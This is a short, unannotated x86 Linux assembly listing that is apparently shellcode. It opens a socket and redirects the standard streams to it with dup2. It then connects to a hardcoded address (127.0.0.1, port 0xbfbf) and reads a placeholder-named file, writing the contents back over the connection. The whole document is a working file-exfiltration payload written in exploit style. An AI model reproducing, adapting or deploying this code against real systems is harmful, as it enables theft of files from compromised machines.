_start:
	xorl  %ebx, %ebx

#socket (2,1,0)
socket:
	pushl %ebx
	incl  %ebx
	pushl %ebx
	pushl $0x2
	pushl $0x66
	popl  %eax
	movl  %esp, %ecx
	int  $0x80
	xchg %ebx, %eax

dup:
	popl  %ecx  # pop 2
dup_loop:
	movb  $0x3f, %al
	int  $0x80
	decl  %ecx
	jns  dup_loop

connect:
	popl  %ebx   # ebx <= 1 
	popl  %edx   # edx <= 0
	pushl $0x0100007f   # ip address 127.0.0.1
	pushw $0xbfbf       # port number
	incl  %ebx   # ebx <= 2
	pushw  %bx
	movl  %esp, %ecx
	movb  $0x66, %al
	pushl %eax   # addrlen
	pushl %ecx   # sockaddr *addr
	pushl %ebx   # sockfd
	movl  %esp, %ecx
	incl  %ebx
	int  $0x80

# eax = open(filepath, 1, 0)
	jmp data_path
open:
	popl %ebx           ## ebx = filepath
	xorl %ecx, %ecx     ## flags
	xorl %edx, %edx     ## mode
	xorl %eax, %eax
	movb $5, %al   
	int $0x80

read:
        movl %eax, %ebx ## 1 - fd
	movl %esp, %ecx 
	sub $0x80, %esp ## 2 - buf
	xorl %edx, %edx 
	movb $0xaa, %dl ## 3 - size 

	xorl %eax, %eax
	movb $3, %al
	int $0x80

write:
        xorl %ebx, %ebx 
	incl %ebx         ## 1- fd : 1
	xorl %edx, %edx 
	movb $0xaa, %dl   ## 3 - size 

	xorl %eax, %eax
	movb $4, %al
	int $0x80

exit:
        movb $1, %al
	int $0x80

data_path:
        call open
	.ascii "FILENAME\0"
